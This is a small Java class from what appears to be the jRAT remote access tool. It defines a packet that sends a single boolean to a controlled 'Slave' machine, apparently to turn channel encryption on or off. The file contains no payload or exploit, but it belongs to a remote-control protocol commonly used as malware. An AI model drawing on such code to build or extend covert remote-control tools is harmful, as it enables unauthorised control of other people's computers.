package io.jrat.client.packets.outgoing;

import io.jrat.client.Slave;

import java.io.DataOutputStream;


public class Packet99Encryption extends AbstractOutgoingPacket {

	private boolean b;

	public Packet99Encryption(boolean b) {
		this.b = b;
	}

	@Override
	public void write(Slave slave, DataOutputStream dos) throws Exception {
		dos.writeBoolean(b);
	}

	@Override
	public byte getPacketId() {
		return 99;
	}

}
